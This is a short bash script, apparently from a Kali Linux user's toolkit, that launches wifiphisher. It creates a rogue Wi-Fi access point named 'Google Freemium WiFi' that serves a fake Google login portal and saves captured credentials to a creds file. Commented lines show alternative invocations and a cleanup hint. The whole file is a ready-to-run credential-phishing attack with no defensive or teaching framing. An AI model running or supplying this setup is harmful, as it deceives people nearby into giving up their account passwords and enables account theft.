#!/bin/bash
#source /home/kali/.aliases

# sudo wifiphisher -pPD /home/kali/working/portals -aI wlan0 -eI wlan1 --logging -cP /home/kali/working


#sudo /home/kali/scripts/initwifi.sh
sudo wifiphisher -pPD /home/kali/working/phisher/portals -p google-login -aI wlan1ap -nE -nD --essid "Google Freemium WiFi" --logging -lP /home/kali/working/phisher/logs/log -cP /home/kali/working/phisher/creds/cred
# --dnsmasq-conf /home/kali/working/phisher/dnsmasq.conf
#sudo systemctl restart hotspot
echo 'if finished, cleanup with:'
echo 'cleanupwifi'
